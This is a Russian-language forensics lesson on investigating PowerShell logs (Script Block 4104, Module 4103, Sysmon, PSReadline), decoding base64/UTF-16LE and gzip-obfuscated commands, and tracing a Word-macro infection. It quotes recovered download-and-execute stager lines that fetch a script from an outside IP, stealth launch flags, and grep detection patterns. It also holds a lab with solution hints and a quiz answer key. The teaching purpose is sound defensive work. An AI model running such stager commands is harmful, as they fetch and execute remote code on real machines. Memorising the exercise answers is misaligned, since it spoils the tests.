---
id: forensics-powershell-logs
title: "PowerShell-логи и Script Block артефакты"
category: forensics
parent: forensics-win-logs
difficulty: hard
order: 4
tags: [powershell, scriptblock, transcription, module, windows, dfir, lolbin]
prerequisites: [forensics-windows-artifacts, forensics-evtx-deep]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting / SOC"
estimated_minutes: 45
summary: "Как включить и читать PowerShell-логирование (Operational, Script Block 4104, Transcription, Module), восстанавливать обфусцированные команды и ловить LOLBin-активность."
lab:
  kind: shell
  title: "Практика: декодировать base64-обфускацию в логе"
  toolset: [core]
  workdir: /home/student/task
  files: [task.md, notes.txt, PS.log]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Найди закодированную команду: `grep FromBase64String PS.log`."
    - "Выдели значение в кавычках: `cut -d'\"' -f2`."
    - "Декодируй: `... | base64 -d`."
    - "Запиши флаг: `grep FromBase64String PS.log | cut -d'\"' -f2 | base64 -d | grep nto > found.txt`."

---

## Вопрос, с которого всё начинается

Тебе дали образ Windows-машины после инцидента. В журналах мелькал
`powershell.exe` с длинной непонятной строкой параметров. Нужно доказать, **что
именно он выполнял** — иначе атаку не подтвердить.

`powershell.exe` — это командная оболочка и язык сценариев Windows (примерно как
`bash` в Linux). Атакующие любят её за возможность выполнять код **в памяти**, не
создавая файла на диске: такой приём называют *fileless* («бесфайловый»). Хорошая
новость — PowerShell умеет записывать свои команды в журналы, и по ним мы
восстановим картину.

## Наш пример: журнал PowerShell

В папке `C:\Windows\System32\winevt\Logs\` лежит файл
`Microsoft-Windows-PowerShell%4Operational.evtx`. `.evtx` — это бинарный формат
журналов событий Windows (**EVTX**, Event Log File). Каждое событие в нём — это
XML-запись с двумя частями: `System` (кто, когда, какой числовой **Event ID** —
«код события») и `EventData` (детали).

Проверим сам файл:

```bash
$ file Microsoft-Windows-PowerShell%4Operational.evtx
Microsoft-Windows-PowerShell%4Operational.evtx: MS Windows Vista Event Log
```

Формат опознан. Нужен инструмент, превращающий EVTX в читаемый текст. Возьмём
`evtx_dump` (из пакета python-evtx):

```bash
$ evtx_dump.py Microsoft-Windows-PowerShell%4Operational.evtx > ps.json
$ wc -l ps.json
8421 ps.json
```

Восемь тысяч событий руками не прочитать — значит, фильтруем по Event ID.

## Шаг 1: находим Script Block Logging (4104)

Ключевое событие PowerShell — **4104**. Это *Script Block Logging*: Windows
записывает **полный текст** каждого выполнявшегося блока скрипта. Именно 4104
часто содержит команду уже в **декодированном** виде, даже если атакующий передал
её закодированной.

Отфильтруем только 4104 через `jq` (утилита для разбора JSON):

```bash
$ jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' ps.json | head -3
$PSVersionTable
Get-ChildItem C:\Users
```

Первые записи безобидны. Поищем в них типичные признаки атаки:

```bash
$ jq -r 'select(.["Event.System.EventID"]==4104) | .["Event.EventData.ScriptBlockText"]' ps.json \
    | grep -iE 'download|iex|frombase64|mimikatz'
IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.0/a.ps1')
```

Вот оно. Разберём строку по частям:

- `New-Object Net.WebClient` — создаёт объект для работы с сетью (как `curl`);
- `DownloadString('http://45.9.148.0/a.ps1')` — скачивает текст скрипта по URL;
- `IEX` — сокращение от `Invoke-Expression`: **выполняет** полученный текст.

Одна строка скачивает и тут же запускает чужой код. Это классическая
**stager**-команда — «первая ступень», которая тянет основную нагрузку.

## Шаг 2: декодируем обфусцированную команду

Часто команда приходит закодированной: `powershell -EncodedCommand <base64>`.
`-EncodedCommand` — это **Base64** (кодирование произвольных данных текстом) от
строки в кодировке **UTF-16LE** (каждый символ — 2 байта). Это не шифрование, а
запутывание. Декодируем:

```bash
$ python3 -c "import base64; print(base64.b64decode('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=').decode('utf-16-le'))"
IEX (New-Object)
```

Ключевая деталь: base64 декодируется **не** в обычный UTF-8, а в UTF-16LE — именно
так PowerShell формирует `-EncodedCommand`. Если раскодировать как UTF-8, получишь
«кракозябры» с нулевыми байтами между символами.

Хитрее — команда сжата (Gzip/Deflate) и затем закодирована base64:

```bash
$ python3 -c "import base64,gzip; print(gzip.decompress(base64.b64decode('H4sIAAAAAAAA...')).decode())"
IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.0/a.ps1')
```

Инструменты **PSDecode** и **CyberChef** (рецепт: From Base64 → Decode text
UTF-16LE → Gunzip) делают это автоматически.

## Шаг 3: сверяем с Sysmon — кто это запустил

Мы знаем, *что* выполнялось. Нужно понять, *какой процесс* это сделал и откуда.
Помогает **Sysmon** — «System Monitor», служба Microsoft, которая пишет события,
которых нет в стандартных журналах (например, полную командную строку при старте
процесса).

Sysmon Event ID **1** — создание процесса. Найдём запуски `powershell`:

```bash
$ evtx_dump.py Sysmon.evtx -o json | jq -r 'select(.["Event.System.EventID"]==1) |
    select(.["Event.EventData.Image"]|test("powershell")) |
    [.["Event.EventData.ParentImage"], .["Event.EventData.CommandLine"]] | @tsv'
WINWORD.EXE	powershell.exe -nop -w hidden -enc SQBFAFgA...
```

Вся картина налицо: `WINWORD.EXE` (Word) породил `powershell` с закодированной
командой. Обычно Word не запускает PowerShell — значит, сработал **макрос** в
документе. А параметры `-nop` (не грузить профиль), `-w hidden` (скрытое окно),
`-enc` (закодированная команда) — готовый набор «стелс»-флагов.

## Шаг 4: куда ушли данные

Найдём сетевые соединения того же процесса. Sysmon Event ID **3** — сетевое
соединение:

```bash
$ evtx_dump.py Sysmon.evtx -o json | jq -r 'select(.["Event.System.EventID"]==3) |
    select(.["Event.EventData.Image"]|test("powershell")) |
    [.["Event.EventData.DestinationIp"], .["Event.EventData.DestinationPort"]] | @tsv'
45.9.148.0	443
```

Адрес совпал с тем, что был в команде. Цепочка замкнулась: **Word → PowerShell →
скачивание и запуск скрипта → соединение с сервером управления (C2)**.

## Что делать, если логирования не было

Script Block Logging **не включён по умолчанию** — его активируют через Group
Policy или реестр (`EnableScriptBlockLogging = 1`). Если 4104 нет, остаются
запасные артефакты:

- **PSReadline history** — файл `ConsoleHost_history.txt` в профиле пользователя
  (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\`). Там команды, введённые
  интерактивно; часто есть то, что не попало в 4104.
- **Transcription** — полная текстовая запись сессии (`PowerShell_transcript*.txt`),
  если включена.
- **Prefetch** — файл `POWERSHELL.EXE-*.pf` доказывает факт запуска.
- **Sysmon 1** — командная строка, даже при выключенном PowerShell-логировании.

```bash
$ cat "/mnt/evidence/Users/bob/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt"
Invoke-WebRequest http://45.9.148.0/a.ps1 -OutFile a.ps1
.\a.ps1
```

**LOLBin** (Living Off the Land Binary) — легитимный системный бинарник, который
атакующий использует вместо своего инструмента, чтобы не приносить файл. Здесь
`powershell.exe` — ровно такой LOLBin: он «родной» для Windows, поэтому не
выглядит подозрительно сам по себе. Смотреть надо на аргументы.

## Полный разбор: от 4104 к исходной команде

Соберём разбор в один сценарий.

1. **Находим событие 4104** (Script Block Logging) — тело скрипта, даже обфусцированного:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
     Where-Object Id -eq 4104 | Select-Object -First 5
   ```
2. **Декодируем.** `-enc` — это Base64 UTF-16LE; декодируем:
   ```powershell
   [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("<base64>"))
   ```
3. **Сверяем с Sysmon.** Событие 1 (создание процесса) — кто родитель, какой пользователь.
4. **Смотрим сеть.** Куда пошёл PowerShell (загрузка, C2).
5. **Что утекло.** По каналам (DNS/HTTP) и файлам, к которым обращался процесс.

## Шпаргалка событий PowerShell

| Лог | EventID | Что даёт |
|-----|---------|----------|
| Operational | 4104 | тело скрипта |
| Operational | 4103 | вывод модуля |
| Transcription | — | полная сессия в файле |
| Module logging | 4103 | вызовы команд |
| Sysmon | 1 | создание процесса |
| Security | 4688 | командная строка |

## Частые вопросы

**Логирование не включено — что осталось?** Prefetch, AmCache, Sysmon (если есть), строки в памяти.

**4104 есть, а 4103 нет.** Script Block пишется всегда (если включён); Module — отдельная настройка.

**Почему обфускация всё равно видна?** 4104 логирует **развёрнутый** скрипт после декодирования интерпретатором.

**Как включить заранее?** Групповой политикой: Script Block Logging + Transcription; в PowerShell 5.1+ это доступно.

## Что мы теперь знаем

- PowerShell пишет **Script Block Logging** (Event ID 4104) — полный текст команд.
- `-EncodedCommand` — это Base64 от **UTF-16LE**; декодируется, а не «взламывается».
- Подозрительные паттерны: `IEX`, `DownloadString`, `FromBase64String`, `-enc`, `-w hidden`.
- **Sysmon** (события 1 и 3) показывает родителя процесса и сетевые соединения.
- Если логирование выключено — есть запас: PSReadline, транскрипция, Prefetch.

## На что смотреть дальше

- **Смотреть только 4104** — коррелируйте с Sysmon 1 (кто запустил) и Sysmon 3 (куда ушло).
- **Забыть про `-EncodedCommand`** — не декодировать base64 как UTF-16LE.
- **Игнорировать PSReadline** — там команды, которых нет в 4104.
- **Верить, что журнал пуст** — событий нет, если аудит выключен; ищите Prefetch/Sysmon.
- **Считать `-w hidden` безобидным** — это стелс-флаг.

## Событие 4103: Module Logging

Кроме Script Block Logging (4104) есть Module Logging (4103) — он пишет, какие
командлеты и модули вызывались, с параметрами:

```
Event ID 4103 — Microsoft-Windows-PowerShell/Operational
Payload:
  CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
  ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://10.0.0.5/a.ps1"
```

Если 4104 выключен, 4103 часто остаётся и показывает параметры вроде `-Uri`,
`-EncodedCommand`, `-WindowStyle Hidden`.

## Если логирование выключено — что осталось

Атакующие часто чистят `Operational` лог. Тогда копаем глубже:

- `ConsoleHost_history.txt` в профиле пользователя — история команд;
- транскрипты (`Start-Transcript`) в `Documents\PowerShell_transcript.*`;
- кэш AMSI-детекций в логе Defender (1116, 1117);
- `$MFT`/USN — факт запуска `powershell.exe` и с какими аргументами;
- Sysmon EventID 1 (ProcessCreate) — командная строка процесса.

```
PS> Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object Id -eq 4104 | Select-Object -First 5 | Format-List
```

## Инструмент: PSDecode и обфускация

`PSDecode` (модуль PowerShell) рекурсивно раскрывает обфускацию: `-enc`,
`FromBase64String`, замену символов, обратный порядок строк.

```
PS> Invoke-PSDecode -Path .\suspicious.ps1
PS> Invoke-PSDecode -Content (Get-Content .\suspicious.ps1 -Raw)
```

После декодирования команда становится читаемой — и по ней видно, куда шёл C2
и что скачивалось.

## Частая ошибка: доверять только 4104

4104 может быть отключён или обрезан по размеру (лимит на длину скрипта).
Тогда одну и ту же команду собирают из нескольких 4104-событий по времени и
`ScriptBlockId`, а недостающие куски ищут в 4103 и Sysmon. Складывать команду
из обрывков — обычная практика при разборе PowerShell-атак.

## Квиз

Проверь себя.

```quiz
- question: "Какой Event ID содержит текст выполняемого скрипт-блока?"
  options:
    - "4104"
    - "4624"
    - "1"
    - "7045"
  answer: 0
- question: "Где хранится история команд PSReadline?"
  options:
    - "в реестре"
    - "ConsoleHost_history.txt в профиле пользователя"
    - "в EVTX"
    - "в SAM"
  answer: 1
- question: "`-EncodedCommand` — это:"
  options:
    - "шифрование AES"
    - "base64 от UTF-16LE"
    - "сжатие"
    - "хеш"
  answer: 1
- question: "Что такое LOLBin?"
  options:
    - "вирус"
    - "легитимный бинарник Windows, используемый для атаки"
    - "тип хэша"
    - "протокол"
  answer: 1
- question: "Что нужно для получения 4104-логов?"
  options:
    - "ничего"
    - "включённое Script Block Logging"
    - "антивирус"
    - "SMB"
  answer: 1
```

## Куда дальше

Мы разобрали, как по логам PowerShell восстановить бесфайловую атаку. В следующем
уроке возьмём другой механизм «невидимого» закрепления — **WMI-подписки**, которые
хранятся не в файлах-скриптах, а в базе WMI, и потому не видны в обычной
автозагрузке. А пока запомни: **PowerShell почти всегда оставляет текст команды —
надо лишь знать, где его искать и как декодировать**.

## Где пригодится

- **CTF Forensics** — задачи с EVTX PowerShell и декодированием payload'ов.
- **DFIR/IR** — расследование fileless-атак и макросов в документах.
- **SOC/Threat Hunting** — детекты на LOLBins и `-EncodedCommand`.
- **Malware analysis** — деобфускация stager-команд.
- **Аудит** — проверка, включено ли логирование PowerShell в парке.
